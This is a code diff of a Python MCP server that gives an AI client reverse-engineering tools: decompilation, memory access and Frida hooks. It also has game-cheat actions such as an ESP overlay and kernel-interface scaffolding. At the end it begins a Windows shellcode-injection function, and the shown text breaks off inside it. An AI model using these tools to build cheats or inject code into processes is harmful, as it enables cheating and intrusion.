 async def generate_yara_rule(session_id: str, address: str, rule_name: str, save_to_brain: bool = True) -> Any:
     """
     Generate a YARA rule from a function's disassembly that survives game updates.
@@ -2211,7 +2195,6 @@ async def generate_yara_rule(session_id: str, address: str, rule_name: str, save
 # 6. GHIDRA ↔ IDA SYMBOL EXPORT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def export_symbols_as_idc(session_id: str, output_path: str = "", limit: int = 1000) -> Any:
     """
     Export all named symbols from the current session as an IDC script
@@ -2254,7 +2237,6 @@ async def export_symbols_as_idc(session_id: str, output_path: str = "", limit: i
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def export_symbols_as_ghidra_script(session_id: str, output_path: str = "", limit: int = 1000) -> Any:
     """
     Export all named symbols from the current session as a Ghidra Python script.
@@ -2312,7 +2294,6 @@ async def export_symbols_as_ghidra_script(session_id: str, output_path: str = ""
 # 7. BINARY DIFFING
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def diff_binaries(session_id_old: str, session_id_new: str, limit: int = 500) -> Any:
     """
     Compare functions between two binaries (e.g., old vs new game version).
@@ -2385,7 +2366,6 @@ async def diff_binaries(session_id_old: str, session_id_new: str, limit: int = 5
 # 8. CONTROL FLOW GRAPH EXPORT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def export_cfg(session_id: str, address: str, format: str = "mermaid") -> Any:
     """
     Export a function's control flow graph as a Mermaid or DOT diagram.
@@ -2488,7 +2468,6 @@ async def export_cfg(session_id: str, address: str, format: str = "mermaid") -> 
 # 9. VTABLE DUMPER
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def dump_vtable(session_id: str, address: str, max_entries: int = 50) -> Any:
     """
     Dump a C++ vtable starting at the given address.
@@ -2570,7 +2549,6 @@ async def dump_vtable(session_id: str, address: str, max_entries: int = 50) -> A
 # 10. FRIDA SNIPPET LIBRARY
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def list_frida_snippets() -> str:
     """
     List all available Frida hook snippets (built-in + custom).
@@ -2593,7 +2571,6 @@ def list_frida_snippets() -> str:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 def render_frida_snippet(snippet_name: str, address: str = "", func_name: str = "",
                          spoof_value: str = "1", arg_count: str = "4",
                          size: str = "8", module_name: str = "") -> str:
@@ -2620,7 +2597,6 @@ def render_frida_snippet(snippet_name: str, address: str = "", func_name: str = 
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 def save_frida_snippet(name: str, description: str, template: str,
                        params: str = "", category: str = "custom") -> str:
     """
@@ -2643,7 +2619,6 @@ def save_frida_snippet(name: str, description: str, template: str,
 # 11. AUTO-ANNOTATOR
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def auto_annotate(session_id: str, limit: int = 200, min_confidence: float = 0.4,
                         dry_run: bool = False) -> Any:
     """
@@ -2791,7 +2766,6 @@ async def auto_annotate(session_id: str, limit: int = 200, min_confidence: float
 # 12. PATTERN LEARNING — SUGGEST NAMES
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def suggest_names(session_id: str, address: str, top_k: int = 5) -> Any:
     """
     Suggest meaningful names for a function based on learned patterns.
@@ -2859,7 +2833,6 @@ async def suggest_names(session_id: str, address: str, top_k: int = 5) -> Any:
 # 13. VULNERABILITY SCANNER
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def vuln_scan(session_id: str, limit: int = 100) -> Any:
     """
     Scan decompiled functions for security vulnerabilities.
@@ -2922,7 +2895,6 @@ async def vuln_scan(session_id: str, limit: int = 100) -> Any:
 # 14. CACHE MANAGEMENT
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def cache_stats() -> str:
     """
     View cache statistics: size, hit rate, and TTL for all caches.
@@ -2945,7 +2917,6 @@ def cache_stats() -> str:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 def cache_clear(cache_name: str = "all") -> str:
     """
     Clear cached data. Options: 'all', 'decompile', 'function', 'disasm'.
@@ -2975,7 +2946,6 @@ def cache_clear(cache_name: str = "all") -> str:
 # 15. AUTO-SESSION DETECTION
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 def detect_backends() -> Any:
     """
     Probe all known ports (IDA:10101, Ghidra:10102, x64dbg:10103, etc.)
@@ -3000,7 +2970,6 @@ def detect_backends() -> Any:
 # 16. WORKFLOW PRESETS
 # ═══════════════════════════════════════════════════════════════════════════════
 
-# @mcp.tool() # Removed for Limit Bypass
 async def full_analysis(session_id: str = "auto", limit: int = 200) -> Any:
     """
     One-command complete binary analysis. Chains:
@@ -3137,7 +3106,6 @@ async def full_analysis(session_id: str = "auto", limit: int = 200) -> Any:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def quick_scan(session_id: str = "auto") -> Any:
     """
     Quick 30-second binary overview. Returns:
@@ -3231,7 +3199,6 @@ async def quick_scan(session_id: str = "auto") -> Any:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 def server_status() -> str:
     """
     Health check dashboard showing:
@@ -3302,7 +3269,6 @@ def server_status() -> str:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def smart_search(session_id: str, query: str) -> Any:
     """
     Intelligently search a binary for logic related to a query.
@@ -3354,7 +3320,6 @@ async def smart_search(session_id: str, query: str) -> Any:
         return handle_error(e)
 
 
-# @mcp.tool() # Removed for Limit Bypass
 async def get_complexity(session_id: str, address: str) -> Any:
     """Get cyclomatic complexity and basic block graph data for a function."""
     try:
@@ -3365,7 +3330,6 @@ async def get_complexity(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def guess_struct(session_id: str, address: str) -> Any:
     """Analyze pointer dereferences in a function to auto-recover a C-struct."""
     try:
@@ -3377,7 +3341,6 @@ async def guess_struct(session_id: str, address: str) -> Any:
     except Exception as e:
         return handle_error(e)
 
-# @mcp.tool() # Removed for Limit Bypass
 async def auto_frida_hook_generator(session_id: str, address: str) -> Any:
     """Automatically generate a Frida hook script based on the function's signature and calling convention."""
     try:
@@ -3411,7 +3374,6 @@ Interceptor.attach(ptr("{address}"), {{
 # ═══════════════════════════════════════════════════════════════════════════════
 from typing import Literal
 
-@mcp.tool()
 async def session_management_tools(
     action: Literal["init_session", "list_sessions", "set_default_session", "check_backends", "detect_backends", "server_status"],
     session_id: str = None, backend: str = None, binary_path: str = None, architecture: str = "x86_64", backend_url: str = ""
@@ -3424,7 +3386,6 @@ async def session_management_tools(
     elif action == "detect_backends": return detect_backends()
     elif action == "server_status": return server_status()
 
-@mcp.tool()
 async def function_navigation_tools(
     action: Literal["get_function", "get_current_address", "get_current_function", "get_xrefs", "get_callees", "get_callers", "list_functions", "get_complexity"],
     session_id: str, address: str = None, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None
@@ -3439,7 +3400,6 @@ async def function_navigation_tools(
     elif action == "list_functions": return await list_functions(session_id, offset, limit, filter_str)
     elif action == "get_complexity": return await get_complexity(session_id, address)
 
-@mcp.tool()
 async def binary_extraction_tools(
     action: Literal["get_strings", "get_globals", "get_segments", "get_imports", "get_exports"],
     session_id: str, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None
@@ -3451,7 +3411,6 @@ async def binary_extraction_tools(
     elif action == "get_imports": return await get_imports(session_id, offset, limit)
     elif action == "get_exports": return await get_exports(session_id, offset, limit)
 
-@mcp.tool()
 async def decompilation_tools(
     action: Literal["decompile_function", "disassemble_at", "batch_decompile", "analyze_functions", "extract_microcode"],
     session_id: str, address: str = None, addresses: list = None
@@ -3463,7 +3422,6 @@ async def decompilation_tools(
     elif action == "analyze_functions": return await analyze_functions(session_id, addresses)
     elif action == "extract_microcode": return await extract_microcode(session_id, address)
 
-@mcp.tool()
 async def memory_debugging_tools(
     action: Literal["read_memory", "set_hardware_breakpoint", "wait_for_breakpoint", "generate_pointer_map", "read_pointer_chain", "hook_network_packets", "dump_memory_region_to_file", "diff_memory"],
     session_id: str, address: str = None, size: int = 256, timeout: int = 15, offsets: List[str] = None, pid: int = None, max_depth: int = 3, max_offset: int = 0x2000, max_packets: int = 50, output_file: str = None
@@ -3478,7 +3436,6 @@ async def memory_debugging_tools(
     elif action == "dump_memory_region_to_file": return await dump_memory_region_to_file(session_id, address, size, output_file)
     elif action == "diff_memory": return await diff_memory(session_id, address, size)
 
-@mcp.tool()
 async def modification_tools(
     action: Literal["rename_symbol", "set_comment", "set_function_type", "rename_local_variable", "set_local_variable_type", "patch_address_assembles", "set_global_variable_type", "patch_bytes"],
     session_id: str, address: str = None, name: str = None, comment: str = None, repeatable: bool = False, signature: str = None, old_name: str = None, new_name: str = None, variable_name: str = None, new_type: str = None, instructions: str = None, hex_bytes: str = None
@@ -3493,7 +3450,6 @@ async def modification_tools(
     elif action == "set_global_variable_type": return await set_global_variable_type(session_id, variable_name, new_type)
     elif action == "patch_bytes": return await patch_bytes(session_id, address, hex_bytes)
 
-@mcp.tool()
 async def structural_tools(
     action: Literal["get_stack_frame_variables", "list_local_types", "get_defined_structures", "analyze_struct_detailed", "get_xrefs_to_field", "declare_c_type", "define_struct", "guess_struct"],
     session_id: str, address: str = None, struct_name: str = None, field_name: str = None, name: str = None, c_declaration: str = None, fields: list = None
@@ -3508,7 +3464,6 @@ async def structural_tools(
     elif action == "define_struct": return await define_struct(session_id, name, fields)
     elif action == "guess_struct": return await guess_struct(session_id, address)
 
-@mcp.tool()
 async def signature_scanning_tools(
     action: Literal["scan_aob", "generate_unique_aob", "generate_yara_rule", "save_signatures", "load_signatures", "validate_signatures", "auto_recover_signatures", "yara_memory_scan"],
     session_id: str = None, pattern: str = None, address: str = None, instruction_count: int = 5, rule_name: str = None, game: str = None, signatures: list = None, yara_rule: str = None, pid: int = None, save_to_brain: bool = True
@@ -3523,7 +3478,6 @@ async def signature_scanning_tools(
     elif action == "auto_recover_signatures": return await auto_recover_signatures(session_id, game)
     elif action == "yara_memory_scan": return await yara_memory_scan(session_id, yara_rule, pid)
 
-@mcp.tool()
 async def game_dumping_tools(
     action: Literal["dump_vtables", "dump_vtable", "generate_game_sdk", "dump_unreal_gnames", "dump_unreal_gobjects", "dump_il2cpp_domain", "scaffold_kernel_interface", "spawn_esp_overlay"],
     session_id: str = None, module_base: str = None, address: str = None, max_entries: int = 50, engine_type: str = "unreal", pid: int = None, gnames_address: str = None, gobjects_address: str = None, game_assembly_base: str = None, game_name: str = None
@@ -3538,7 +3492,6 @@ async def game_dumping_tools(
     elif action == "scaffold_kernel_interface": return scaffold_kernel_interface(game_name)
     elif action == "spawn_esp_overlay": return spawn_esp_overlay()
 
-@mcp.tool()
 async def ai_intelligence_tools(
     action: Literal["auto_annotate", "suggest_names", "vuln_scan", "index_functions_for_similarity", "find_similar_functions", "full_analysis", "quick_scan", "cross_analyze", "smart_search"],
     session_id: str = None, limit: int = 200, min_confidence: float = 0.4, address: str = None, top_k: int = 5, threshold: float = 0.5, static_session: str = None, dynamic_session: str = None, query: str = None
@@ -3554,7 +3507,220 @@ async def ai_intelligence_tools(
     elif action == "cross_analyze": return await cross_analyze(static_session, dynamic_session, address)
     elif action == "smart_search": return await smart_search(session_id, query)
 
+async def binary_analysis_sandbox(
+    action: Literal["compile_shellcode", "disassemble_bytes", "emulate_subroutine", "solve_symbolic_execution", "symbolic_string_decrypt", "extract_ast_segments"],
+    assembly_text: str = None, arch: str = "x86", mode: str = "64", hex_bytes: str = None, address: int = 0x1000, init_registers: dict = None, trace: bool = False, target_addr: int = 0x400050, session_id: str = None, str_address: str = None, instruction_bounds: int = 0x50, c_code: str = None, query_type: str = "if_statement"
+) -> Any:
+    """Consolidated router for shellcode, emulation, symbolic execution, and AST parsing."""
+    if action == "compile_shellcode": return compile_shellcode(assembly_text, arch, mode)
+    elif action == "disassemble_bytes": return disassemble_bytes(hex_bytes, arch, mode, address)
+    elif action == "emulate_subroutine": return emulate_subroutine(hex_bytes, arch, mode, init_registers, trace)
+    elif action == "solve_symbolic_execution": return solve_symbolic_execution(hex_bytes, address, target_addr)
+    elif action == "symbolic_string_decrypt": return await symbolic_string_decrypt(session_id, str_address, instruction_bounds)
+    elif action == "extract_ast_segments": return extract_ast_segments(c_code, query_type)
+
+async def export_sync_tools(
+    action: Literal["export_symbols_as_idc", "export_symbols_as_ghidra_script", "export_cfg", "sync_offsets_to_github", "sync_symbols", "heal_offsets", "diff_binaries", "save_binary"],
+    session_id: str = None, output_path: str = "", limit: int = 1000, address: str = None, format: str = "mermaid", repo_name: str = None, github_token: str = None, offsets: dict = None, file_path: str = "offsets.json", source_session_id: str = None, target_session_id: str = None, game_name: str = None, version: str = None, offsets_header_path: str = None, session_id_old: str = None, session_id_new: str = None
+) -> Any:
+    """Consolidated router for syncing to Github, generating scripts, and diffing binaries."""
+    if action == "export_symbols_as_idc": return await export_symbols_as_idc(session_id, output_path, limit)
+    elif action == "export_symbols_as_ghidra_script": return await export_symbols_as_ghidra_script(session_id, output_path, limit)
+    elif action == "export_cfg": return await export_cfg(session_id, address, format)
+    elif action == "sync_offsets_to_github": return sync_offsets_to_github(repo_name, github_token, offsets, file_path)
+    elif action == "sync_symbols": return await sync_symbols(source_session_id, target_session_id, limit)
+    elif action == "heal_offsets": return await heal_offsets(session_id, game_name, version, offsets_header_path)
+    elif action == "diff_binaries": return await diff_binaries(session_id_old, session_id_new, limit)
+    elif action == "save_binary": return await save_binary(session_id, output_path)
+
+async def frida_scripting_tools(
+    action: Literal["list_frida_snippets", "render_frida_snippet", "save_frida_snippet", "instrument_execution", "auto_frida_hook_generator"],
+    session_id: str = None, javascript_code: str = None, snippet_name: str = None, address: str = "", func_name: str = "", name: str = None, description: str = None, template: str = None
+) -> Any:
+    """Consolidated router for Frida dynamic instrumentation templates and execution."""
+    if action == "list_frida_snippets": return list_frida_snippets()
+    elif action == "render_frida_snippet": return render_frida_snippet(snippet_name, address, func_name)
+    elif action == "save_frida_snippet": return save_frida_snippet(name, description, template)
+    elif action == "instrument_execution": return await instrument_execution(session_id, javascript_code)
+    elif action == "auto_frida_hook_generator": return await auto_frida_hook_generator(session_id, address)
+
+def knowledge_base_tools(
+    action: Literal["store_knowledge", "recall_knowledge"],
+    key: str = None, summary: str = None, query: str = None
+) -> Any:
+    """Consolidated router for interacting with the persistent local sqlite brain database."""
+    if action == "store_knowledge": return store_knowledge(key, summary)
+    elif action == "recall_knowledge": return recall_knowledge(query)
+
+async def history_cache_tools(
+    action: Literal["view_request_log", "execute_idapython_script", "view_diff_history", "undo_last_change", "cache_stats", "cache_clear"],
+    session_id: str = "", limit: int = 50, code: str = None, cache_name: str = "all"
+) -> Any:
+    """Consolidated router for auditing history, managing caches, and running arbitrary python on backend."""
+    if action == "view_request_log": return view_request_log(limit, session_id)
+    elif action == "execute_idapython_script": return execute_idapython_script(session_id, code)
+    elif action == "view_diff_history": return view_diff_history(session_id, limit)
+    elif action == "undo_last_change": return await undo_last_change(session_id)
+    elif action == "cache_stats": return cache_stats()
+    elif action == "cache_clear": return cache_clear(cache_name)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CONSOLIDATED ROUTER TOOLS (Limit Bypass)
+# ═══════════════════════════════════════════════════════════════════════════════
+from typing import Literal
+
 @mcp.tool()
+@audit_log
+async def session_management_tools(
+    action: Literal["init_session", "list_sessions", "set_default_session", "check_backends", "detect_backends", "server_status"],
+    session_id: str = None, backend: str = None, binary_path: str = None, architecture: str = "x86_64", backend_url: str = ""
+) -> Any:
+    """Consolidated router for managing AI sessions and backend connectivity."""
+    if action == "init_session": return init_session(session_id, backend, binary_path, architecture, backend_url)
+    elif action == "list_sessions": return list_sessions()
+    elif action == "set_default_session": return set_default_session(session_id)
+    elif action == "check_backends": return check_backends()
+    elif action == "detect_backends": return detect_backends()
+    elif action == "server_status": return server_status()
+
+@mcp.tool()
+@audit_log
+async def function_navigation_tools(
+    action: Literal["get_function", "get_current_address", "get_current_function", "get_xrefs", "get_callees", "get_callers", "list_functions"],
+    session_id: str, address: str = None, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None
+) -> Any:
+    """Consolidated router for binary navigation and cross-reference mapping."""
+    if action == "get_function": return await get_function(session_id, address)
+    elif action == "get_current_address": return await get_current_address(session_id)
+    elif action == "get_current_function": return await get_current_function(session_id)
+    elif action == "get_xrefs": return await get_xrefs(session_id, address)
+    elif action == "get_callees": return await get_callees(session_id, address)
+    elif action == "get_callers": return await get_callers(session_id, address)
+    elif action == "list_functions": return await list_functions(session_id, offset, limit, filter_str)
+
+@mcp.tool()
+@audit_log
+async def binary_extraction_tools(
+    action: Literal["get_strings", "get_globals", "get_segments", "get_imports", "get_exports"],
+    session_id: str, offset: int = 0, limit: int = 100, filter_str: Optional[str] = None
+) -> Any:
+    """Consolidated router for extracting symbols, strings, and sections from a binary."""
+    if action == "get_strings": return await get_strings(session_id, offset, limit, filter_str)
+    elif action == "get_globals": return await get_globals(session_id, offset, limit, filter_str)
+    elif action == "get_segments": return await get_segments(session_id, offset, limit)
+    elif action == "get_imports": return await get_imports(session_id, offset, limit)
+    elif action == "get_exports": return await get_exports(session_id, offset, limit)
+
+@mcp.tool()
+@audit_log
+async def decompilation_tools(
+    action: Literal["decompile_function", "disassemble_at", "batch_decompile", "analyze_functions"],
+    session_id: str, address: str = None, addresses: list = None
+) -> Any:
+    """Consolidated router for fetching assembly and decompiled pseudo-code."""
+    if action == "decompile_function": return await decompile_function(session_id, address)
+    elif action == "disassemble_at": return await disassemble_at(session_id, address)
+    elif action == "batch_decompile": return await batch_decompile(session_id, addresses)
+    elif action == "analyze_functions": return await analyze_functions(session_id, addresses)
+
+@mcp.tool()
+@audit_log
+async def memory_debugging_tools(
+    action: Literal["read_memory", "set_hardware_breakpoint", "wait_for_breakpoint", "generate_pointer_map", "read_pointer_chain", "hook_network_packets", "dump_memory_region_to_file", "diff_memory"],
+    session_id: str, address: str = None, size: int = 256, timeout: int = 15, offsets: List[str] = None, pid: int = None, max_depth: int = 3, max_offset: int = 0x2000, max_packets: int = 50, output_file: str = None
+) -> Any:
+    """Consolidated router for dynamic memory reading, debugging, and pointer mapping."""
+    if action == "read_memory": return await read_memory(session_id, address, size)
+    elif action == "set_hardware_breakpoint": return await set_hardware_breakpoint(session_id, address)
+    elif action == "wait_for_breakpoint": return await wait_for_breakpoint(session_id, timeout)
+    elif action == "generate_pointer_map": return await generate_pointer_map(session_id, pid, address, max_depth, max_offset)
+    elif action == "read_pointer_chain": return await read_pointer_chain(session_id, address, offsets)
+    elif action == "hook_network_packets": return await hook_network_packets(session_id, max_packets, timeout)
+    elif action == "dump_memory_region_to_file": return await dump_memory_region_to_file(session_id, address, size, output_file)
+    elif action == "diff_memory": return await diff_memory(session_id, address, size)
+
+@mcp.tool()
+@audit_log
+async def modification_tools(
+    action: Literal["rename_symbol", "set_comment", "set_function_type", "rename_local_variable", "set_local_variable_type", "patch_address_assembles", "set_global_variable_type", "patch_bytes"],
+    session_id: str, address: str = None, name: str = None, comment: str = None, repeatable: bool = False, signature: str = None, old_name: str = None, new_name: str = None, variable_name: str = None, new_type: str = None, instructions: str = None, hex_bytes: str = None
+) -> Any:
+    """Consolidated router for modifying names, comments, types, and patching assembly/bytes."""
+    if action == "rename_symbol": return await rename_symbol(session_id, address, name)
+    elif action == "set_comment": return await set_comment(session_id, address, comment, repeatable)
+    elif action == "set_function_type": return await set_function_type(session_id, address, signature)
+    elif action == "rename_local_variable": return await rename_local_variable(session_id, address, old_name, new_name)
+    elif action == "set_local_variable_type": return await set_local_variable_type(session_id, address, variable_name, new_type)
+    elif action == "patch_address_assembles": return await patch_address_assembles(session_id, address, instructions)
+    elif action == "set_global_variable_type": return await set_global_variable_type(session_id, variable_name, new_type)
+    elif action == "patch_bytes": return await patch_bytes(session_id, address, hex_bytes)
+
+@mcp.tool()
+@audit_log
+async def structural_tools(
+    action: Literal["get_stack_frame_variables", "list_local_types", "get_defined_structures", "analyze_struct_detailed", "get_xrefs_to_field", "declare_c_type", "define_struct"],
+    session_id: str, address: str = None, struct_name: str = None, field_name: str = None, name: str = None, c_declaration: str = None, fields: list = None
+) -> Any:
+    """Consolidated router for analyzing and creating memory structures and frames."""
+    if action == "get_stack_frame_variables": return await get_stack_frame_variables(session_id, address)
+    elif action == "list_local_types": return await list_local_types(session_id)
+    elif action == "get_defined_structures": return await get_defined_structures(session_id)
+    elif action == "analyze_struct_detailed": return await analyze_struct_detailed(session_id, name)
+    elif action == "get_xrefs_to_field": return await get_xrefs_to_field(session_id, struct_name, field_name)
+    elif action == "declare_c_type": return await declare_c_type(session_id, c_declaration)
+    elif action == "define_struct": return await define_struct(session_id, name, fields)
+
+@mcp.tool()
+@audit_log
+async def signature_scanning_tools(
+    action: Literal["scan_aob", "generate_unique_aob", "generate_yara_rule", "save_signatures", "load_signatures", "validate_signatures", "auto_recover_signatures", "yara_memory_scan"],
+    session_id: str = None, pattern: str = None, address: str = None, instruction_count: int = 5, rule_name: str = None, game: str = None, signatures: list = None, yara_rule: str = None, pid: int = None, save_to_brain: bool = True
+) -> Any:
+    """Consolidated router for scanning arrays of bytes and generating/testing memory signatures."""
+    if action == "scan_aob": return await scan_aob(session_id, pattern)
+    elif action == "generate_unique_aob": return await generate_unique_aob(session_id, address, instruction_count)
+    elif action == "generate_yara_rule": return await generate_yara_rule(session_id, address, rule_name, save_to_brain)
+    elif action == "save_signatures": return save_signatures(game, signatures)
+    elif action == "load_signatures": return load_signatures(game)
+    elif action == "validate_signatures": return await validate_signatures(session_id, game)
+    elif action == "auto_recover_signatures": return await auto_recover_signatures(session_id, game)
+    elif action == "yara_memory_scan": return await yara_memory_scan(session_id, yara_rule, pid)
+
+@mcp.tool()
+@audit_log
+async def game_dumping_tools(
+    action: Literal["dump_vtables", "dump_vtable", "generate_game_sdk", "dump_unreal_gnames", "dump_unreal_gobjects", "dump_il2cpp_domain", "scaffold_kernel_interface", "spawn_esp_overlay"],
+    session_id: str = None, module_base: str = None, address: str = None, max_entries: int = 50, engine_type: str = "unreal", pid: int = None, gnames_address: str = None, gobjects_address: str = None, game_assembly_base: str = None, game_name: str = None
+) -> Any:
+    """Consolidated router for dumping game engine globals, SDKs, and launching external overlays."""
+    if action == "dump_vtables": return await dump_vtables(session_id, module_base)
+    elif action == "dump_vtable": return await dump_vtable(session_id, address, max_entries)
+    elif action == "generate_game_sdk": return await generate_game_sdk(session_id, engine_type)
+    elif action == "dump_unreal_gnames": return dump_unreal_gnames(pid, gnames_address)
+    elif action == "dump_unreal_gobjects": return dump_unreal_gobjects(pid, gobjects_address)
+    elif action == "dump_il2cpp_domain": return dump_il2cpp_domain(pid, game_assembly_base)
+    elif action == "scaffold_kernel_interface": return scaffold_kernel_interface(game_name)
+    elif action == "spawn_esp_overlay": return spawn_esp_overlay()
+
+@mcp.tool()
+@audit_log
+async def ai_intelligence_tools(
+    action: Literal["auto_annotate", "suggest_names", "vuln_scan", "index_functions_for_similarity", "find_similar_functions", "full_analysis", "quick_scan", "cross_analyze"],
+    session_id: str = None, limit: int = 200, min_confidence: float = 0.4, address: str = None, top_k: int = 5, threshold: float = 0.5, static_session: str = None, dynamic_session: str = None
+) -> Any:
+    """Consolidated router for running AI-driven automated reverse engineering."""
+    if action == "auto_annotate": return await auto_annotate(session_id, limit, min_confidence)
+    elif action == "suggest_names": return await suggest_names(session_id, address, top_k)
+    elif action == "vuln_scan": return await vuln_scan(session_id, limit)
+    elif action == "index_functions_for_similarity": return await index_functions_for_similarity(session_id, limit)
+    elif action == "find_similar_functions": return await find_similar_functions(session_id, address, top_k, threshold)
+    elif action == "full_analysis": return await full_analysis(session_id, limit)
+    elif action == "quick_scan": return await quick_scan(session_id)
+    elif action == "cross_analyze": return await cross_analyze(static_session, dynamic_session, address)
+
+@mcp.tool()
+@audit_log
 async def binary_analysis_sandbox(
     action: Literal["compile_shellcode", "disassemble_bytes", "emulate_subroutine", "solve_symbolic_execution", "symbolic_string_decrypt", "extract_ast_segments"],
     assembly_text: str = None, arch: str = "x86", mode: str = "64", hex_bytes: str = None, address: int = 0x1000, init_registers: dict = None, trace: bool = False, target_addr: int = 0x400050, session_id: str = None, str_address: str = None, instruction_bounds: int = 0x50, c_code: str = None, query_type: str = "if_statement"
@@ -3568,6 +3734,7 @@ async def binary_analysis_sandbox(
     elif action == "extract_ast_segments": return extract_ast_segments(c_code, query_type)
 
 @mcp.tool()
+@audit_log
 async def export_sync_tools(
     action: Literal["export_symbols_as_idc", "export_symbols_as_ghidra_script", "export_cfg", "sync_offsets_to_github", "sync_symbols", "heal_offsets", "diff_binaries", "save_binary"],
     session_id: str = None, output_path: str = "", limit: int = 1000, address: str = None, format: str = "mermaid", repo_name: str = None, github_token: str = None, offsets: dict = None, file_path: str = "offsets.json", source_session_id: str = None, target_session_id: str = None, game_name: str = None, version: str = None, offsets_header_path: str = None, session_id_old: str = None, session_id_new: str = None
@@ -3583,8 +3750,9 @@ async def export_sync_tools(
     elif action == "save_binary": return await save_binary(session_id, output_path)
 
 @mcp.tool()
+@audit_log
 async def frida_scripting_tools(
-    action: Literal["list_frida_snippets", "render_frida_snippet", "save_frida_snippet", "instrument_execution", "auto_frida_hook_generator"],
+    action: Literal["list_frida_snippets", "render_frida_snippet", "save_frida_snippet", "instrument_execution"],
     session_id: str = None, javascript_code: str = None, snippet_name: str = None, address: str = "", func_name: str = "", name: str = None, description: str = None, template: str = None
 ) -> Any:
     """Consolidated router for Frida dynamic instrumentation templates and execution."""
@@ -3592,9 +3760,9 @@ async def frida_scripting_tools(
     elif action == "render_frida_snippet": return render_frida_snippet(snippet_name, address, func_name)
     elif action == "save_frida_snippet": return save_frida_snippet(name, description, template)
     elif action == "instrument_execution": return await instrument_execution(session_id, javascript_code)
-    elif action == "auto_frida_hook_generator": return await auto_frida_hook_generator(session_id, address)
 
 @mcp.tool()
+@audit_log
 def knowledge_base_tools(
     action: Literal["store_knowledge", "recall_knowledge"],
     key: str = None, summary: str = None, query: str = None
@@ -3604,6 +3772,7 @@ def knowledge_base_tools(
     elif action == "recall_knowledge": return recall_knowledge(query)
 
 @mcp.tool()
+@audit_log
 async def history_cache_tools(
     action: Literal["view_request_log", "execute_idapython_script", "view_diff_history", "undo_last_change", "cache_stats", "cache_clear"],
     session_id: str = "", limit: int = 50, code: str = None, cache_name: str = "all"
@@ -3615,3 +3784,241 @@ async def history_cache_tools(
     elif action == "undo_last_change": return await undo_last_change(session_id)
     elif action == "cache_stats": return cache_stats()
     elif action == "cache_clear": return cache_clear(cache_name)
+
+@mcp.tool()
+@audit_log
+async def execute_backend_action(session_id: str, action: str, kwargs_json: str = "{}") -> Any:
+    """Executes any dynamically mapped backend action on the connected adapter."""
+    try:
+        adapter = get_adapter(session_id)
+        if not hasattr(adapter, action):
+            return {"error": f"Action '{action}' is not supported by this backend."}
+        method = getattr(adapter, action)
+        import json
+        kwargs = json.loads(kwargs_json)
+        
+        import inspect
+        if inspect.iscoroutinefunction(method):
+            result = await method(**kwargs)
+        else:
+            result = method(**kwargs)
+            
+        return {"result": result}
+    except Exception as e:
+        return handle_error(e)
+
+
+# ==============================================================================
+# PIPELINE EXECUTION
+# ==============================================================================
+
+@mcp.tool()
+@audit_log
+async def execute_pipeline(session_id: str, pipeline_json: str) -> Any:
+    """Execute a multi-step sequence natively.
+    pipeline_json is a JSON array of dicts: {"action": "...", "args": {...}}
+    """
+    import json
+    try:
+        pipeline = json.loads(pipeline_json)
+        results = []
+        for step in pipeline:
+            action = step.get("action")
+            args = step.get("args", {})
+            adapter = get_adapter(session_id)
+            if hasattr(adapter, action):
+                method = getattr(adapter, action)
+                import inspect
+                if inspect.iscoroutinefunction(method):
+                    res = await method(**args)
+                else:
+                    res = method(**args)
+                results.append({"action": action, "result": res})
+            else:
+                results.append({"action": action, "error": f"Action '{action}' is not supported."})
+        return {"pipeline_results": results}
+    except Exception as e:
+        return handle_error(e)
+
+# ==============================================================================
+# BACKGROUND EVENT POLLING
+# ==============================================================================
+
+import threading
+import asyncio
+import time
+
+async def _poll_all_sessions():
+    sessions = list(session_manager._sessions.keys())
+    for sid in sessions:
+        try:
+            adapter = get_adapter(sid)
+            if hasattr(adapter, "poll_events"):
+                import inspect
+                method = adapter.poll_events
+                if inspect.iscoroutinefunction(method):
+                    res = await method()
+                else:
+                    res = method()
+                
+                if res and "events" in res and res["events"]:
+                    for evt in res["events"]:
+                        logger.info(f"[EVENT] Session {sid}: {evt}")
+        except Exception:
+            pass
+
+def background_event_poller():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    while True:
+        try:
+            loop.run_until_complete(_poll_all_sessions())
+        except Exception:
+            pass
+        time.sleep(0.1)
+
+poller_thread = threading.Thread(target=background_event_poller, daemon=True)
+poller_thread.start()
+
+# ==============================================================================
+# OFFENSIVE TOOLING
+# ==============================================================================
+
+import ctypes
+import binascii
+
+def inject_shellcode(pid: int, shellcode_hex: str, technique: str = "createremotethread") -> Any:
+    """Inject raw hex shellcode into a target process using Windows API."""
+    try:
+        shellcode = binascii.unhexlify(shellcode_hex.replace(" ", "").replace("0x", "").replace(",", ""))
+        
+        PAGE_EXECUTE_READWRITE = 0x40
